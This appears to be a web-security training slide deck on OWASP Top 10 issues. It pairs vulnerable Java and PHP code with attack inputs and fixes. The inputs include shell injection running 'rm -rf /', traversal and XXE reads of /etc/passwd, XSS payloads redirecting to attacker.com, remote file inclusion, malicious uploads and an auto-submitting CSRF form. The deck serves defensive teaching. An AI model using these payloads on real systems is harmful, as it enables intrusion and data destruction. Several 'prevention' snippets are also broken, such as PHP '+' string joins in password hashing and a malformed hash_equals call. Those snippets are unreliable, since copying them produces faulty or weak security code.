title: Web-Security
theme: sjaakvandenberg/cleaver-light
--
# Web-Security

--

### OWASP TOP 10 2013

1. **Injection**
2. **Broken Authentication and Session Management**
3. **Cross-Site Scripting (XSS)**
4. Insecure Direct Object References
5. Security Misconfiguration
6. Sensitive Data Exposure
7. Missing Function Level Access Control
8. **Cross-Site Request Forgery (CSRF)**
9. Using Known Vulnerable Components
10. **Unvalidated Redirects and Forwards**

--

### What Will Be Covered

* Injection
* Directory Traversal + Path Enumeration
* Host Header Poisoning + Cache Poisoning
* Unvalidated Redirects
* Clickjacking
* XSS
* Unserialize Attacks
* Session hijacking
* File Upload
* XXE
* CSRF
* Timing Attacks
* Password Hashing

--

### Shell Injection Vulnerability
**Java**:
```java
@RequestMapping("/")
public ModelAndView listFiles(@RequestParam("fileName") String fileName) {
  if (fileName.startsWith("/a/valid/file")) {
    Runtime.getRuntime().exec("cat " +  fileName);
  }
}
```

**PHP**:
```php
shell_exec('cat ' . $_GET['fileName']);
```

--

### Shell Injection Attack
**Java**:
```java
@RequestMapping("/")
public ModelAndView listFiles(@RequestParam("fileName") String fileName) {
  if (fileName.startsWith("/a/valid/file")) {
    Runtime.getRuntime().exec("cat " +  fileName);
  }
}
```

**PHP**:
```php
shell_exec('cat ' . $_GET['fileName']);
```


* **GET** /?fileName=/a/valid/file;rm -rf /

```java
Runtime.getRuntime().exec("cat /a/valid/file; rm -rf /");
```

--

### Shell Injection Prevention

**Better but vulnerable to directory traversal (next slide)**

**Java**:

```java
Runtime.getRuntime().exec(new String[]{"cat", fileName});
```

**PHP**:

```php
shell_exec("cat " . escapeshellarg($_GET['fileName']));
```

* **Same applies to LDAP, SMB, SQL!**
* **Beware of combinations**, e.g. executing SMB commands on the command line


--

### Directory Traversal Vulnerability
**Java**:

```java
@RequestMapping("/")
public ModelAndView listFiles(@RequestParam("fileName") String fileName) {
  if (fileName.startsWith("/a/valid/directory")) {
    Runtime.getRuntime().exec(new String[]{"cat", fileName});
  }
}
```

**PHP**:

```php
shell_exec("cat " . escapeshellarg($_GET['fileName']));
```

--

### Directory Traversal Attack
**Java**:
```java
@RequestMapping("/")
public ModelAndView listFiles(@RequestParam("fileName") String fileName) {
  if (fileName.startsWith("/a/valid/directory")) {
    Runtime.getRuntime().exec(new String[]{"cat", fileName});
  }
}
```

**PHP**:

```php
shell_exec("cat " . escapeshellarg($_GET['fileName']));
```

* **GET** /?fileName=/a/valid/directory/../../../etc/passwd
* **GET** /?fileName=\\a\\valid\\directory\\..\\..\\..\\sensitive.file

--

### Directory Traversal Prevention

**Java**:

```java
fileName = (new File(fileName)).getCanonicalPath();
if (fileName.startsWith("/a/valid/directory")) {
  // etc
}
```

**PHP**:

```php
$path = realpath($_GET['fileName']);  // attention: crashes when path does not exist, use a lib
if (strpos($path, "/a/valid/directory") === 0) {
  // etc
}
```

--

### Path Enumeration Attack

**Java**:

```java
fileName = (new File(fileName)).getCanonicalPath();
if (fileName.startsWith("/a/valid/directory")) {
  // etc
}
```

**PHP**:

```php
$path = realpath($_GET['fileName']);  // attention: crashes when path does not exist, use a lib
if (strpos($path, "/a/valid/directory") === 0) {
  // etc
}
```

* **GET** /?fileName=../../../../../../../../../../../Users/myuser/Programming/core/3rdparty/sabre/dav/lib/DAV/Browser/assets/sabredav.css

--

### Path Enumeration Prevention

Don't allow relative paths

```php
$path = str_replace('\\', '/', $path);  // replace windows backslashes
if (strpos($path, '/../') !== false || strrchr($path, '/') === '/..') {
   throw new Exception();
}
$path = realpath($path);
```

--

### Host Header Poisoning Vulnerability
**Java**:
```java
@RequestMapping("/reset-password")
public void resetPasswordEmail(HttpServletRequest request, @RequestParam("email") String email) {
  String resetUrl = request.getRequestURL().toString() + "/new-password";
  String message = "Please go to " + resetUrl + " and enter a new password";
  Mail.send(email, message)
}
```

**PHP**:
```php
$resetUrl = $_SERVER['SERVER_NAME'] . "/new-password";
$message = "Please go to " . resetUrl . " and enter a new password";
mail(email, message);
```

--

### Host Header Poisoning Attack

```http
POST /reset-password HTTP/1.1
Host: myattackdomain.com
```

```http
POST /reset-password HTTP/1.1
Host: valid-domain.com
Host: myattackdomain.com
```

```http
POST /reset-password HTTP/1.1
Host: valid-domain.com:@myattackdomain.com
```

```http
POST /reset-password HTTP/1.1
Host: valid-domain.com
X-Forwarded-Host: myattackdomain.com
```

--

### Host Header Poisoning Prevention
Middleware approach:

**Java**:
```java
Collection<String> validDomains = Arrays.asList("myshopdomain.com", "192.168.0.1");

validDomains.stream()
  .filter(allowedDomain -> request.getServerName().equals(allowedDomain))
  .findAny()
  .orThrow(new HttpForbiddenException());
```

**PHP**:
```php
$validDomains = ["myshopdomain.com", "192.168.0.1"];

if (count(array_filter($validDomains, function ($validDomain) {
  return $_SERVER['HTTP_HOST'] === $validDomain;
})) === 0) {
  throw new HttpForbiddenException();
}
```

--

### Cache Poisoning Attack
**Similar to Host Header Poisoning**

Joomla used to generate HTML templates with absolute URLs:

```
GET / HTTP/1.1
Host: cow"onerror='alert(1)'rel='stylesheet'
```

```xml
<link href="http://cow"onerror='alert(1)'rel='stylesheet'/" rel="canonical"/>
```

--

### Cache Poisoning Prevention

**Depends on your Cache Setup**

More information on [http://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html](http://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html)

--

### Unvalidated Redirects Vulnerability

```java
@RequestMapping("/redirect")
public void redirectTo(@RequestParam("url") String toUrl) {
  return "redirect:" + toUrl;
}
```

**PHP**:
```php
header('Location: ' . $_GET['url']);
exit;
```

--

### Unvalidated Redirects Attack

```java
@RequestMapping("/redirect")
public void redirectTo(@RequestParam("url") String toUrl) {
  return "redirect:" + toUrl;
}
```

**PHP**:
```php
header('Location: ' . $_GET['url']);
exit;
```

```http
GET /redirect?url=http://myfakeshop.com
```

```http
GET /redirect?url=http://valid-shop.com:@myfakeshop.com
```

--

### Unvalidated Redirects Prevention

**Java**:
```java
@RequestMapping("/redirect")
public void redirectTo(@RequestParam("url") String toUrl) {
  if (toUrl.equals("http://valid-domain.com/the/url")) {
    return "redirect:" + toUrl;
  }
}
```

**PHP**:
```php
if ($_GET['url'] === 'http://valid-domain.com/the/url') {
  header('Location: ' . $_GET['url']);
  exit;
}
```

--

### Clickjacking Attack

Invisible IFrame + CSS magic which redirects clicks to target website

[![IMAGE ALT TEXT HERE](http://img.youtube.com/vi/3mk0RySeNsU/0.jpg)](http://www.youtube.com/watch?v=3mk0RySeNsU)

--

### Clickjacking Prevention
Middleware approach, more options (**DENY**, **SAMEORIGIN**, **ALLOW-FROM uri**)

**Java**:
```java
HttpservletResponse response;
response.setHeader('X-Frame-Options', 'DENY');
```

**PHP**:
```php
header('X-Frame-Options: DENY')
```
--

### XSS Vulnerability
PHP examples this time (I'm not that familiar with JSP)

```php
<input type="text" value="<?php echo $accountId ?>"/>
```

```php
<?php echo $accountId ?>
```

```php
<script>var accountId = <?php echo $accountId ?>;</script>
```

```php
<<?php echo $accountId ?>>
```

--

### XSS Attack

**$accountId = "\" /> &lt;script&gt;alert('hi')&lt;/script&gt;<img src=\""**

```php
<input type="text" value="" /> <script>alert('hi')</script><img src=""/>
```

**$accountId = "&lt;script&gt;alert('hi')&lt;/script&gt;"**

```php
<script>alert('hi')</script>
```
**$accountId = '0; window.location = "http://attacker.com"'**

```php
<script>var accountId = 0; window.location = "http://attacker.com"; </script>
```

**$accountId = "a>&lt;script&gt;alert('hi')&lt;/script";**

```php
<a><script>alert('hi')</script>
```

--

### Lesser Known XSS Vulnerabilities
**href**, **src**, **style** and **&lt;style&gt;** allow javascript:alert('hi')
**SVG** allows JavaScript

```php
<a href="<?php echo $accountId>">link</a>
```

```php
<a href="/?value=<?php echo $accountId>">link</a>
```

```php
<!-- <?php echo $comment ?> -->
```

```php
<img src="<?php echo $accountId>"/>
```

```php
<img style="<?php echo $accountId>"/>
```

```http
GET /uploaded.svg
```

```php
<style><?php echo $accountId></style>
```

```javascript
$('<a>').html(response);  // use text() instead
```

--

### XSS Prevention
* **Content-Type: application/json; charset=utf-8** for JSON responses
* Have I mentioned SVG? If needed consider serving from a different domain
* If user supplied HTML is needed, use a whitelist xml parser (why? Did you test for injecting AngularJS directives :D?)
* Escape based on usage
* Whitelist URIs for **src** and **href** (Why? Because &lt;img src="jav	ascript:alert('XSS');"> and tons of other ways)
* Do not use dynamic CSS style sheets
* [Consult the prevention sheet](https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet#XSS_Prevention_Rules_Summary), too much possibilities
* Use [CSP](https://developer.mozilla.org/en-US/docs/Web/Security/CSP)
* [Do not use relative paths in CSS and old Doctypes](http://blog.portswigger.net/2015/02/prssi.html)

--

### Session Hijacking Vulnerability

* Ever seen these URLs: **/some-url?SESSION_ID=1234kj123k12323** ?
* No secure cookies flag?
* No HSTS?

--

### Session Hijacking Attack

Generate url with your session id and send it to the victim:

**https://myshop.com/login?SESSION_ID=1234kj123k12323**

You can now reuse the session

If no secure cookie flag is set you can MITM the cookie

If HSTS is not present the attacker can use [MITM for HTTP redirects](https://www.owasp.org/index.php/HTTP_Strict_Transport_Security#Threats)

--

### Session Hijacking Prevention
* Session ID should have enough entropy to prevent guessing
* Regenerate session on login and privilege change
* Set expiration dates for sessions and cookies
* Cookie paths
* HTTPS everywhere (also subdomains)
* HSTS (includeSubDomains or be vulnerable to [MITM cookies from subdomains](https://www.owasp.org/index.php/HTTP_Strict_Transport_Security#Problems))
* HTTPS cookies

More on [https://www.owasp.org/index.php/Session_Management_Cheat_Sheet](https://www.owasp.org/index.php/Session_Management_Cheat_Sheet)

--

### Unserialize Vulnerability

```java
class Command {
    public $name;
    public function getName() return $this->name;  
}

$commandClass = unserialize($_POST['command']);

$command->getName();
```

--

### Unserialize Attack
Instantiate another class with values which are used in \__destruct and \__wakeup!

Any Framework? Zend? -> upload arbitrary files, execute and include anything

Why? Because they've got classes that do work in their destructor, instantiate those, prefill values and you're done

[More information](https://statuscode.ch/2015/02/diving-into-egroupware/)
--

### Unserialize Prevention
**DO NOT UNSERIALIZE USER INPUT**
--

### File Upload Vulnerability
Facepalm ahead

```php
if(preg_match('~^[a-z_\.0-9]+\.(jp[e]?g|png|gif)$~i', $filename)) {
    require($filename);
}
```

```php
if (in_array($_FILES["file"]["type"], ["image/gif", "image/png"])) {
    $destination = "uploads/" . $_FILES["file"]["name"];
    move_uploaded_file($_FILES["file"]["tmp_name"], $destination);
}
```

```php
include($_GET['navigation'] '.php');
```

```php
if (@getimagesize($_FILES["file"]["tmp_name"]) !== false) {
    $destination = "uploads/" . $_FILES["file"]["name"];
    move_uploaded_file($_FILES["file"]["tmp_name"], $destination);
}
```


--

### File Upload Attack

```php
include($_GET['id'] '.php');
```

```
GET /?id=myuploaded.php
GET /?id=http://myserver/evil
```


```php
if (@getimagesize($_FILES["file"]["tmp_name"]) !== false) {
    $destination = "uploads/" . $_FILES["file"]["name"];
    move_uploaded_file($_FILES["file"]["tmp_name"], $destination);  // see next slide
}
if(preg_match('~^[a-z_\.0-9]+\.(jp[e]?g|png|gif)$~i', $filename)) {
    require($filename);
}
```

Embed comment in jpeg (Parser stops before parsing garbage image data)

```php
<?php do_something_evil(); __halt_compiler();
```

--

### File Upload Attack 2

```php
if (in_array($_FILES["file"]["type"], ["image/gif", "image/png"])) {
    $destination = "uploads/" . $_FILES["file"]["name"];
    move_uploaded_file($_FILES["file"]["tmp_name"], $destination);
}
```

Two ways (and they can be combined \o/):

```http
Content-Type: multipart/form-data; boundary=----ThisIsABoundary

 ------ThisIsABoundary
Content-Disposition: form-data; name="file"; filename="evil.php"
Content-Type: image/jpeg

<?php phpinfo();
 ------ThisIsABoundary--
```

Filename: ../../unsafe/directory/myfile.php

--

### File Upload Attack 3

Apache feature: [Double Extensions](https://www.acunetix.com/websitesecurity/upload-forms-threat/) ❀(*´◡`*)❀

> Files can have more than one extension, and the order of the extensions is normally irrelevant. For example, if the file welcome.html.fr maps onto content type text/html and language French then the file welcome.fr.html will map onto exactly the same information. If more than one extension is given which maps onto the same type of meta-information, then the one to the right will be used, except for languages and content encodings. For example, if .gif maps to the MIME-type image/gif and .html maps to the MIME-type text/html, then the file welcome.gif.html will be associated with the MIME-type text/html.

If we don't specify 123 as mime-type, **file.php.123** will be executed as PHP m/

Chrome + IE sniffing: Chrome/IE try to find out the mimetype by parsing the file -> execute code from file.txt

--

### File Upload Prevention
* Use a separate static content server and domain
* Add  X-Content-Type-Options: nosniff  to prevent content sniffing
* Generate filename, **NEVER, EVER** use user supplied mime types or names (**$_FILES[‘uploadedfile’][‘name’]:**, **$_FILES[‘uploadedfile’][‘type’]**)
* NodeJS same issue
* Do not execute anything from the upload directory (no include, require)
* Use a dumb file upload server (nginx) + research configs
* Webhosting...
* Disallow special files (.htaccess, [.user.ini](http://php.net/manual/en/configuration.file.per-user.php), web.config, robots.txt, crossdomain.xml, clientaccesspolicy.xml) and turn off .htaccess parsing
* Remove executable bits from uploads (644)
* Set the correct content type when serving the file
* Disallow SVG (JavaScript can be embedded) and HTML
* [http://nullcandy.com/php-image-upload-security-how-not-to-do-it/](http://nullcandy.com/php-image-upload-security-how-not-to-do-it/)
--

### XXE Vulnerability

**Java**:
```java
DocumentBuilderFactory dbFactory = DocumentBuilderFactory.newInstance();
DocumentBuilder dBuilder = dbFactory.newDocumentBuilder();
Document doc = dBuilder.parse(userSuppliedXml);
```

**PHP:**
```php
$dom = new DomDocument($userSuppliedXml);
echo $dom->saveXml();
```

--

### XXE Attack

**Java**:
```java
DocumentBuilderFactory dbFactory = DocumentBuilderFactory.newInstance();
DocumentBuilder dBuilder = dbFactory.newDocumentBuilder();
Document doc = dBuilder.parse(userSuppliedXml);
```

**PHP:**
```php
$dom = new DomDocument($userSuppliedXml);
echo $dom->saveXml();
```


```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [  
 <!ELEMENT foo ANY >
 <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
```

--

### XXE Prevention

* Disable XML External Entity Processing!

**Java**:
```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
String FEATURE = "http://xml.org/sax/features/external-general-entities";
dbf.setFeature(FEATURE, false);
```

**PHP**:
```php
$default = libxml_disable_entity_loader(true);
$dom = new DomDocument($userSuppliedXml);
libxml_disable_entity_loader(false);

echo $dom->saveXml();
```

**libxml_disable_entity_loader** not threadsafe on php-fpm and  PHP &lt;5.6), use [ZendXML](https://github.com/zendframework/ZendXml)
--

### CSRF Vulnerability
**Java**:
```java
@RequestMapping("/delete-user")
public void deleteUser(@RequestParam("user") String user) {
  if (isAuthenticated()) {
    userService.delete(user)
  }
}
```

**PHP**:

```php
if (isAuthenticated()) {
  $userService->delete($_POST['user'])
}
```

--

### CSRF Attack

Attack via hidden form, include it on a page the user surfs to, e.g. google ads :)

```xml
<form action="https://myshop.com/delete-user" method="post">
<input name="user" value="admin">
</form>
<script>
  document.forms[0].submit();
</script>
```

--

### CSRF Prevention

Generate a token with valid timespan and pass it to client (NO COOKIE!!!), validate token for each request

Spring: CSRF enforced by default since Spring Security 4.0

```xml
<input type="hidden" name="${_csrf.parameterName}" value="${_csrf.token}"/>
```
```xml
<meta name="_csrf" content="${_csrf.token}"/>
<meta name="_csrf_header" content="${_csrf.headerName}"/>
```

Beware of [CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/Access_control_CORS#Access-Control-Allow-Credentials) with credentials enabled or CSRF all of your API!

--

### Timing Attack Vulnerabilities
**Java:**
```java
@RequestMapping("/authenticate")
public void resetPasswordEmail(@RequestParam("user") String user, @RequestParam("pass") String pass) {
  if (user.equals("John") && pass.equals("Passw0rd")) {
    // authenticate user
  }
}
```

**PHP:**
```php
if ($_GET['user'] === 'John' && $_GET['pass'] === 'Passw0rd') {
  // authenticate user
}
```

--

### Timing Attack

```php
function isStringEqual($a, $b) {
  if (strlen($a) !== strlen($b)) {
    return false;
  }

  for ($i=0; $i<min(strlen($a), strlen($b)); $i++) {
    if ($a[$i] !== $b[$i]) {
      return false;
    }
  }

  return true;
}
```

--

### Timing Attack Prevention
**Constant time string compare algorithms!**

**Java:**
```java
// method constantEquals has to be implemented by you or a lib
if (constantEquals(user, "John") && constantEquals(pass, "Passw0rd")) {
  // authenticate user
}
```

**PHP:**
```php
// in PHP 5.6
if (hash_equals('John', $_GET['user'] && hash_equals('Passw0rd', $_GET['pass']) {
  // authenticate user
}
```

--

### Password Hashing Vulnerability


**Java**:
```java
String password = "mypass";
String hashedPassword = hash(password);
```

**PHP**:
```php
$password = "mypass";
$hashedPassword = md5($password);
```

--

### Passwort Hashing Attack

Rainbow Tables, nuf said

--

### Passwort Hashing Attack Prevention

**bcrypt!**

**Java**:
```java
String global_salt = BCrypt.gensalt();  // saved in config
String salt = BCrypt.gensalt();  // saved in database with each user
String hashedPassword = BCrypt.hashpw(password, global_salt + salt);
```

**PHP**:
```php
// PHP 5.5
$hashAndSalt = password_hash($password + $globalSalt, PASSWORD_BCRYPT);

if (password_verify($password + $globalSalt, $hashAndSalt)) {
}
```

--

### Resources
* [OWASP Top 10](https://www.owasp.org/index.php/Top_10_2013-Top_10)
* [Shocking News in PHP Exploitation](https://www.nds.rub.de/media/hfs/attachments/files/2010/03/hackpra09_fu_esser_php_exploits1.pdf)
